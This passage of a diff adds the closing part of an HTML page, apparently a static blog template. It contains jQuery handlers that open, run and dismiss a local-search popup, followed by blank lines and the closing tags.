+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
